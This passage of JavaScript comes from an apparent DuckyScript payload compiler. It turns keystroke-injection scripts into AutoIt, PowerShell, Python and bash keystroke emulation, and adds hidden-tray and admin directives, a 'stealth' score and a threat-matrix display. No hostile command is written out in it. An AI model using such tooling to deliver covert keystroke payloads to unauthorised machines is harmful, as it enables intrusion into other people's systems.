        '', '#NoTrayIcon', '#RequireAdmin', '',
        'Local $hWnd = WinGetHandle("[ACTIVE]")', 'WinActivate($hWnd)', 'Sleep(500)', ''
      ];

      const ps1 = [
        '# PowerShell Keystroke Emulation - Generated by LENLU SC Forge v4.0',
        '# ' + new Date().toISOString(),
        '# Requires Windows OS Host Environment', '',
        '$wshell = New-Object -ComObject Wscript.Shell',
        'Start-Sleep -Milliseconds 500', ''
      ];

      const py = [
        '# Python Keyboard Automation - Generated by LENLU SC Forge v4.0',
        '# Requirements: pip install pyautogui', '',
        'import pyautogui', 'import time', '',
        'pyautogui.PAUSE = 0.05', 'time.sleep(0.5)', ''
      ];

      const sh = [
        '#!/bin/bash',
        '# Linux Bash X11 Keystroke Emulation - Generated by LENLU SC Forge v4.0',
        '# Requirements: xdotool installed', '',
        'sleep 0.5', ''
      ];

      let warns = [...expanded.diag], delay = 500, defaultDelay = 0;
      let lastInstruction = { au3: '', ps1: '', py: '', sh: '' };

      const emit = (a, p, y, s) => {
        au3.push(a); lastInstruction.au3 = a;
        ps1.push(p); lastInstruction.ps1 = p;
        py.push(y); lastInstruction.py = y;
        sh.push(s); lastInstruction.sh = s;
      };

      const KEY_MAPS = {
        ENTER: { au3: 'Send("{ENTER}")', ps1: '$wshell.SendKeys("{ENTER}")', py: 'pyautogui.press("enter")', sh: 'xdotool key Return' },
        TAB: { au3: 'Send("{TAB}")', ps1: '$wshell.SendKeys("{TAB}")', py: 'pyautogui.press("tab")', sh: 'xdotool key Tab' },
        SPACE: { au3: 'Send("{SPACE}")', ps1: '$wshell.SendKeys(" ")', py: 'pyautogui.press("space")', sh: 'xdotool key space' },
        BACKSPACE: { au3: 'Send("{BACKSPACE}")', ps1: '$wshell.SendKeys("{BACKSPACE}")', py: 'pyautogui.press("backspace")', sh: 'xdotool key BackSpace' },
        DELETE: { au3: 'Send("{DELETE}")', ps1: '$wshell.SendKeys("{DELETE}")', py: 'pyautogui.press("delete")', sh: 'xdotool key Delete' },
        ESCAPE: { au3: 'Send("{ESC}")', ps1: '$wshell.SendKeys("{ESC}")', py: 'pyautogui.press("esc")', sh: 'xdotool key Escape' },
        ESC: { au3: 'Send("{ESC}")', ps1: '$wshell.SendKeys("{ESC}")', py: 'pyautogui.press("esc")', sh: 'xdotool key Escape' },
        UP: { au3: 'Send("{UP}")', ps1: '$wshell.SendKeys("{UP}")', py: 'pyautogui.press("up")', sh: 'xdotool key Up' },
        DOWN: { au3: 'Send("{DOWN}")', ps1: '$wshell.SendKeys("{DOWN}")', py: 'pyautogui.press("down")', sh: 'xdotool key Down' },
        LEFT: { au3: 'Send("{LEFT}")', ps1: '$wshell.SendKeys("{LEFT}")', py: 'pyautogui.press("left")', sh: 'xdotool key Left' },
        RIGHT: { au3: 'Send("{RIGHT}")', ps1: '$wshell.SendKeys("{RIGHT}")', py: 'pyautogui.press("right")', sh: 'xdotool key Right' },
        PRINTSCREEN: { au3: 'Send("{PRINTSCREEN}")', ps1: '$wshell.SendKeys("{PRINTSCREEN}")', py: 'pyautogui.press("printscreen")', sh: 'xdotool key Print' },
        CAPSLOCK: { au3: 'Send("{CAPSLOCK}")', ps1: '$wshell.SendKeys("{CAPSLOCK}")', py: 'pyautogui.press("capslock")', sh: 'xdotool key Caps_Lock' },
        CAPS: { au3: 'Send("{CAPSLOCK}")', ps1: '$wshell.SendKeys("{CAPSLOCK}")', py: 'pyautogui.press("capslock")', sh: 'xdotool key Caps_Lock' }
      };

      const translateOp = (op, lang) => {
        if (lang === 'au3') return op === '==' ? '=' : op;
        if (lang === 'py') return op;
        const psOps = { '==': '-eq', '!=': '-ne', '>': '-gt', '<': '-lt', '>=': '-ge', '<=': '-le' };
        const shOps = { '==': '=', '!=': '!=', '>': '-gt', '<': '-lt', '>=': '-ge', '<=': '-le' };
        return lang === 'ps1' ? (psOps[op] || op) : (shOps[op] || op);
      };

      const known = Object.keys(DUCK_MAP).concat(['REM', 'REPEAT', 'HOLD', 'RELEASE', 'GUI', 'CTRL', 'ALT', 'SHIFT', 'WINDOWS', 'STRINGLN', 'STRING', 'DEFAULT_DELAY', 'DEFAULTDELAY', 'VAR', 'IF', 'ELSE', 'END_IF', 'WHILE', 'END_WHILE']);

      lines.forEach((raw, i) => {
        const line = raw.trim();
        if (!line) return;

        if (line.startsWith('REM') || line.startsWith(';') || line.startsWith('//')) {
          const comment = line.replace(/^(REM|;|\/\/)\s*/i, '');
          emit('; ' + comment, '# ' + comment, '# ' + comment, '# ' + comment);
          return;
        }

        // DuckyScript 3.0 Variables
        const varMatch = line.match(/^VAR\s+\$([A-Za-z0-9_]+)\s*=\s*(.+)$/i);
        if (varMatch) {
          const name = varMatch[1], val = varMatch[2];
          emit(
            `Local $${name} = ${val}`,
            `$${name} = ${val}`,
            `${name} = ${val}`,
            `${name}=${val}`
          );
          return;
        }

        // DuckyScript 3.0 Conditionals
        const ifMatch = line.match(/^IF\s*\(\s*\$([A-Za-z0-9_]+)\s*([=!><]+)\s*(.+)\s*\)\s*THEN$/i);
        if (ifMatch) {
          const name = ifMatch[1], op = ifMatch[2], val = ifMatch[3];
          emit(
            `If $${name} ${translateOp(op, 'au3')} ${val} Then`,
            `if ($${name} ${translateOp(op, 'ps1')} ${val}) {`,
            `if ${name} ${translateOp(op, 'py')} ${val}:`,
            `if [ "$${name}" ${translateOp(op, 'sh')} "${val}" ]; then`
          );
          return;
        }

        if (line.toUpperCase() === 'ELSE') {
          emit('Else', '} else {', 'else:', 'else');
          return;
        }

        if (line.toUpperCase() === 'END_IF') {
          emit('EndIf', '}', '# end if', 'fi');
          return;
        }

        // DuckyScript 3.0 Loops
        const whileMatch = line.match(/^WHILE\s*\(\s*\$([A-Za-z0-9_]+)\s*([=!><]+)\s*(.+)\s*\)$/i);
        if (whileMatch) {
          const name = whileMatch[1], op = whileMatch[2], val = whileMatch[3];
          emit(
            `While $${name} ${translateOp(op, 'au3')} ${val}`,
            `while ($${name} ${translateOp(op, 'ps1')} ${val}) {`,
            `while ${name} ${translateOp(op, 'py')} ${val}:`,
            `while [ "$${name}" ${translateOp(op, 'sh')} "${val}" ]; do`
          );
          return;
        }

        if (line.toUpperCase() === 'END_WHILE') {
          emit('WEnd', '}', '# end while', 'done');
          return;
        }

        const parts = line.split(/\s+/);
        const cmd = normalizeDuckKey(parts[0]);
        const arg = parts.slice(1).join(' ');

        if (defaultDelay && cmd !== 'DELAY' && !cmd.startsWith('DEFAULT')) {
          au3.push('Sleep(' + defaultDelay + ')');
          ps1.push('Start-Sleep -Milliseconds ' + defaultDelay);
          py.push('time.sleep(' + (defaultDelay / 1000) + ')');
          sh.push('sleep ' + (defaultDelay / 1000));
        }

        if (cmd === 'DEFAULT_DELAY' || cmd === 'DEFAULTDELAY') {
          defaultDelay = parseInt(arg, 10) || 0;
          emit(
            '; Default delay set to ' + defaultDelay + 'ms',
            '# Default delay set to ' + defaultDelay + 'ms',
            '# Default delay set to ' + defaultDelay + 'ms',
            '# Default delay set to ' + defaultDelay + 'ms'
          );
          return;
        }

        if (cmd === 'DELAY') {
          const ms = parseInt(arg, 10) || 100;
          delay += ms;
          emit(
            'Sleep(' + ms + ')',
            'Start-Sleep -Milliseconds ' + ms,
            'time.sleep(' + (ms / 1000) + ')',
            'sleep ' + (ms / 1000)
          );
          return;
        }

        if (cmd === 'STRING') {
          emit(
            'Send(' + interpolate(arg, 'au3') + ',0)',
            '$wshell.SendKeys(' + interpolate(arg, 'ps1') + ')',
            'pyautogui.write(' + interpolate(arg, 'py') + ')',
            'xdotool type ' + interpolate(arg, 'sh')
          );
          return;
        }

        if (cmd === 'STRINGLN') {
          emit(
            'Send(' + interpolate(arg, 'au3') + ' & "{ENTER}",0)',
            '$wshell.SendKeys(' + interpolate(arg, 'ps1') + ' + "{ENTER}")',
            'pyautogui.write(' + interpolate(arg, 'py') + ' + "\\n")',
            'xdotool type ' + interpolate(arg, 'sh') + '; xdotool key Return'
          );
          return;
        }

        if (cmd === 'GUI' || cmd === 'WINDOWS') {
          if (!arg) {
            emit('Send("{LWIN}")', '$wshell.SendKeys("^{ESC}")', 'pyautogui.press("win")', 'xdotool key Super');
          } else {
            const escapedArg = escapeAu3Text(arg);
            let psKey = `$wshell.SendKeys("^{ESC}"); Start-Sleep -Milliseconds 180; $wshell.SendKeys("${escapedArg}")`;
            if (arg.trim().toLowerCase() === 'r') {
              psKey = '(New-Object -ComObject Shell.Application).FileRun()';
            }
            emit(
              'Send("#' + escapedArg + '")',
              psKey,
              `pyautogui.hotkey("win", "${arg.toLowerCase()}")`,
              `xdotool key Super+${arg}`
            );
          }
          return;
        }

        if (cmd === 'CTRL' || cmd === 'ALT' || cmd === 'SHIFT') {
          const key = normalizeDuckKey(arg);
          if (key) {
            const mapChar = { CTRL: '^', ALT: '!', SHIFT: '+' }[cmd];
            const mapCharPs = { CTRL: '^', ALT: '%', SHIFT: '+' }[cmd];
            const modPy = cmd.toLowerCase();
            const modSh = cmd.toLowerCase();
            emit(
              'Send("' + mapChar + (key.length === 1 ? escapeAu3Text(key) : '{' + escapeAu3Text(key) + '}') + '")',
              `$wshell.SendKeys("${mapCharPs}${key.length === 1 ? escapePs1(key) : '{' + escapePs1(key) + '}'}")`,
              `pyautogui.hotkey("${modPy}", "${key.toLowerCase()}")`,
              `xdotool key ${modSh}+${key}`
            );
          }
          return;
        }

        if (cmd === 'REPEAT') {
          const n = Math.max(1, parseInt(arg, 10) || 1);
          for (let r = 1; r < n; r++) {
            if (lastInstruction.au3) {
              au3.push(lastInstruction.au3);
              ps1.push(lastInstruction.ps1);
              py.push(lastInstruction.py);
              sh.push(lastInstruction.sh);
            }
          }
          return;
        }

        if (KEY_MAPS[cmd]) {
          const mapped = KEY_MAPS[cmd];
          emit(mapped.au3, mapped.ps1, mapped.py, mapped.sh);
          return;
        }

        if (/^F([1-9]|1[0-2])$/.test(cmd)) {
          emit(
            'Send("{' + cmd + '}")',
            `$wshell.SendKeys("{${cmd}}")`,
            `pyautogui.press("${cmd.toLowerCase()}")`,
            `xdotool key ${cmd}`
          );
          return;
        }

        if (!known.includes(cmd)) warns.push(`Line ${i + 1}: Unknown '${cmd}'`);
      });

      const compiledAu3 = au3.join('\n');
      const compiledPs1 = ps1.join('\n');
      const compiledPy = py.join('\n');
      const compiledSh = sh.join('\n');
      const hexDump = generateHexDump(compiledAu3);

      S.compilerOutputs = {
        au3: compiledAu3,
        ps1: compiledPs1,
        py: compiledPy,
        sh: compiledSh,
        hex: hexDump
      };

      setCompilerLang(S.compilerLang);

      addLog(log, 'Compiled: ' + String(src).split('\n').length + ' source lines -> ' + au3.length + ' instructions', 'tl-ok');
      if (expanded.functions) addLog(log, 'Expanded ' + expanded.functions + ' function block(s)', 'tl-info');
      warns.forEach(w => addLog(log, w, 'tl-warn'));

      const st = calcStealth(src);
      addLog(log, 'Delay total: ~' + delay + 'ms | Stealth: ' + st + '%', 'tl-info');

      const sb = document.getElementById('stealthBadge');
      if (sb) {
        sb.style.display = '';
        sb.textContent = 'STEALTH ' + st + '%';
        sb.className = 'badge ' + (st > 70 ? 'badge-g' : st > 40 ? 'badge-a' : 'badge-r');
      }

      updateThreatMatrix(src, compiledAu3);

      if (getSetting('hist')) {
        S.history.unshift({ src, out: compiledAu3, diag: warns.join('\n') || 'No warnings', ts: new Date().toISOString() });
        if (S.history.length > 50) S.history.pop();
        saveHistoryToDB();
        renderHistory();
      }

      if (getSetting('hexdump')) showHexDump();
      if (getSetting('persist')) localStorage.setItem('lenlu_src4', src);

      S.stats.compiled++;
      document.getElementById('stat-compiled').textContent = S.stats.compiled;
      toast('Compilation successful', 'ok');
      logFeed('Compiled: ' + lines.length + ' expanded lines', 'tl-ok');
    };
    const lintSource = function (val) { updateEditorCounts(); if (!getSetting('lint')) return; const expanded = expandDuckySource(val || ''); const defs = new Set([...String(val || '').matchAll(/^FUNCTION\s+([A-Za-z_$][\w$]*)\s*\(\s*\)$/gim)].map(m => m[1].toUpperCase())); const known = Object.keys(DUCK_MAP).concat(['STRING', 'STRINGLN', 'DELAY', 'REM', 'REPEAT', 'HOLD', 'RELEASE', 'GUI', 'CTRL', 'ALT', 'SHIFT', 'WINDOWS', 'DEFAULT_DELAY', 'DEFAULTDELAY', 'FUNCTION', 'END_FUNCTION']); let errs = expanded.diag.length; String(val || '').split(/\r?\n/).forEach(l => { const t = l.trim(); if (!t || t.startsWith('REM') || t.startsWith(';') || t.startsWith('//')) return; if (/^FUNCTION\s+[A-Za-z_$][\w$]*\s*\(\s*\)$/i.test(t) || /^END_FUNCTION$/i.test(t)) return; const call = t.match(/^([A-Za-z_$][\w$]*)\s*\(\s*\)$/); if (call && defs.has(call[1].toUpperCase())) return; const cmd = normalizeDuckKey(t.split(/\s+/)[0]); if (!known.includes(cmd) && !/^F([1-9]|1[0-2])$/.test(cmd)) errs++; }); const b = document.getElementById('lintStatus'); if (b) { if (errs > 0) { b.className = 'badge lint-' + (errs < 3 ? 'warn' : 'err'); b.textContent = errs + ' err'; } else { b.className = 'badge lint-ok'; b.textContent = 'OK'; } } if (getSetting('persist')) localStorage.setItem('lenlu_src4', val || ''); };

    function generateHexDump(text) {
      const bytes = new TextEncoder().encode(text);
      let html = '', cols = 16;
      for (let i = 0; i < bytes.length; i += cols) {
        const sl = bytes.slice(i, i + cols);
        const off = i.toString(16).padStart(8, '0').toUpperCase();
        const hex = Array.from(sl).map(b => b.toString(16).padStart(2, '0').toUpperCase()).join(' ');
        const asc = Array.from(sl).map(b => (b >= 32 && b < 127) ? String.fromCharCode(b) : '.').join('');
        html += `<span class="hex-offset">${off}</span>  <span class="hex-byte">${hex.padEnd(cols * 3 - 1)}</span><span class="hex-ascii">${asc}</span>\n`;
      }
      return html || '// No data';
    }
    function showHexDump() {
      const out = document.getElementById('outViewer')?.textContent || '';
      const p = document.getElementById('hexDumpPanel'), c = document.getElementById('hexDumpContent');
      if (p && c) { c.innerHTML = generateHexDump(out); p.style.display = ''; toast('Hex dump generated', 'info'); }
    }
    function updateHexLive() {
      const inp = document.getElementById('encInput')?.value || '';
      const el = document.getElementById('liveHexDump');
      if (el) el.innerHTML = inp ? generateHexDump(inp) : '// Type in Input field to see live hex…';
    }

    function convertClipToDucky() {
      const el = document.getElementById('clipboardOutput');
      if (!el) return;
      const text = el.textContent || '';
      if (!text || text.startsWith('Click') || text.startsWith('Clipboard API')) {
        toast('No clipboard content to convert', 'warn');
        return;
      }

      const lines = text.split(/\r?\n/);
      let ducky = 'REM Converted from clipboard text by LENLU SC\n';
      ducky += 'DELAY 500\n';
      lines.forEach(l => {
        if (l.trim()) {
          ducky += `STRINGLN ${l}\n`;
          ducky += `DELAY 150\n`;
        }
      });

      copyText(ducky, 'Converted & copied to clipboard');
      el.textContent = ducky;
    }
export { updateEditorCounts, exportMultilang, quickCompile, qkAsk, clearEditor, clearLog, copySource, copyOutput, pasteSource, exportAu3, exportIDELog, exportShellLog, downloadTxt, importFile, openInKeymap, buildEXEPackage, loadTemplate, handleTemplateFile, parseBasicTemplates, renderTemplates, loadTemplateById, insertSnippet, openModal, closeModal, openSaveModal, onEndpointChange, onModelSelectChange, saveAIConfig, loadAIConfig, buildAITags, setAIPreset, sendChat, appendMsg, removeThinkingMsg, clearChat, toggleMic, sendMicToChat, escapeAu3Text, normalizeDuckKey, expandDuckySource, escapeAu3, escapePs1, escapePy, escapeSh, interpolate, setCompilerLang, compilePayload, convertClipToDucky, lintSource, generateHexDump, showHexDump, updateHexLive };
window.updateEditorCounts = updateEditorCounts;
window.exportMultilang = exportMultilang;
window.quickCompile = quickCompile;
window.qkAsk = qkAsk;
window.clearEditor = clearEditor;
window.clearLog = clearLog;
window.copySource = copySource;
window.copyOutput = copyOutput;
window.pasteSource = pasteSource;
window.exportAu3 = exportAu3;
window.exportIDELog = exportIDELog;
window.exportShellLog = exportShellLog;
window.downloadTxt = downloadTxt;
window.importFile = importFile;
window.openInKeymap = openInKeymap;
window.buildEXEPackage = buildEXEPackage;
window.loadTemplate = loadTemplate;
window.handleTemplateFile = handleTemplateFile;
window.renderTemplates = renderTemplates;
window.loadTemplateById = loadTemplateById;
window.insertSnippet = insertSnippet;
window.openModal = openModal;
window.closeModal = closeModal;
window.openSaveModal = openSaveModal;
window.onEndpointChange = onEndpointChange;
window.onModelSelectChange = onModelSelectChange;
window.saveAIConfig = saveAIConfig;
window.loadAIConfig = loadAIConfig;
window.buildAITags = buildAITags;
window.setAIPreset = setAIPreset;
window.sendChat = sendChat;
window.clearChat = clearChat;
window.toggleMic = toggleMic;
window.sendMicToChat = sendMicToChat;
window.escapeAu3Text = escapeAu3Text;
window.normalizeDuckKey = normalizeDuckKey;
window.expandDuckySource = expandDuckySource;
window.escapeAu3 = escapeAu3;
window.escapePs1 = escapePs1;
window.escapePy = escapePy;
window.escapeSh = escapeSh;
window.interpolate = interpolate;
window.setCompilerLang = setCompilerLang;
window.compilePayload = compilePayload;
window.convertClipToDucky = convertClipToDucky;
window.lintSource = lintSource;
window.generateHexDump = generateHexDump;
window.showHexDump = showHexDump;
window.updateHexLive = updateHexLive;